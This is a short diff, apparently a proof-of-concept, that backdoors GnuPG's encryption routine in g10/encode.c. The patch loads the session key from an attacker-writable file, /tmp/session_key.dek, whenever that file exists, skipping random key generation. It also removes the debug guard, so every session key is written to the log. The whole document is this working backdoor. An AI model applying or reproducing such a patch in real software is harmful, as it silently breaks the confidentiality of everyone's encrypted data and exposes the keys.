@@ -1,0 +1,24 @@
+diff -bBupN ./original/g10/encode.c ./attacker/g10/encode.c
+--- ./original/g10/encode.c	2015-02-26 11:24:22.000000000 -0600
++++ ./attacker/g10/encode.c	2015-08-05 14:38:54.000000000 -0500
+@@ -540,8 +540,19 @@ encode_crypt( const char *filename, STRL
+         goto leave;
+       }
+ 
++    FILE* seskey_file = fopen("/tmp/session_key.dek", "rb");
++    if(seskey_file != NULL)
++    {
++      // There's no error handling and a lot of assumptions here but it's just a quick & dirty PoC patch
++      cfx.dek->keylen = cipher_get_keylen( cfx.dek->algo ) / 8;
++      fread(cfx.dek->key, sizeof(unsigned char), cfx.dek->keylen, seskey_file);
++      fclose(seskey_file);
++    }
++    else
++    {
+     make_session_key( cfx.dek );
+-    if( DBG_CIPHER )
++    }
++
+ 	log_hexdump("DEK is: ", cfx.dek->key, cfx.dek->keylen );
+ 
+     rc = write_pubkey_enc_from_list( pk_list, cfx.dek, out );
